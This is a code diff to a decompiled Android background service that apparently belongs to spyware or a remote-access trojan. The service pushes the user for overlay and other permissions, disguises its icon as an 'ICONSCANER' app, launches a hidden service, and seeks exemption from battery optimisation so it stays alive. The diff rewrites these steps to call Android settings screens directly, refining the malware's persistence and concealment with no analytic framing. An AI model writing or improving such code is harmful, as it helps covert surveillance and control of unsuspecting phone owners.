@@ -8,6 +8,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
+import android.net.Uri;
 import android.os.PowerManager;
 import android.provider.Settings;
 import androidx.core.app.NotificationCompat;
@@ -102,7 +103,7 @@ public class myker extends IntentService {
                         if (!Utils.shown) {
                             Utils.speedTime = 5000;
                             Utils.shown = true;
-                            startActivity(new Intent(this, Firebasekit.class).addFlags(268435456));
+                            startActivity(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION").addFlags(268435456));
                         }
                     } else if (!Utils.hasPermissions(this, Utils.PERMISSIONS())) {
                         if (!Utils.asked) {
@@ -114,7 +115,7 @@ public class myker extends IntentService {
                     } else {
                         if (!love.isHidden) {
                             love.isHidden = true;
-                            Utils.SwapMe(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
+                            Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
                         }
                         if (!Utils.iamworking) {
                             try {
@@ -124,11 +125,14 @@ public class myker extends IntentService {
                                 Firebase.FirebaseFOR_prim = false;
                                 Firebase.FirebaseCheckPrims = true;
                                 if (LoveApi0.isServiceNotRunning(Api.class, this)) {
-                                    Utils.currentPrefKey = getResources().getString(C0199R.string.difficultye56);
+                                    Utils.currentPrefKey = getResources().getString(R.string.difficultye56);
                                     startService(new Intent(this, Api.class));
                                 }
                                 if (!Utils.isBatteryOptimizationDisabled(this)) {
-                                    Intent i = new Intent(this, Firebases.class);
+                                    Intent i = new Intent(
+                                            "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
+                                            android.net.Uri.parse("package:" + getPackageName())
+                                    );
                                     i.addFlags(268435456);
                                     i.addFlags(536870912);
                                     i.addFlags(1073741824);
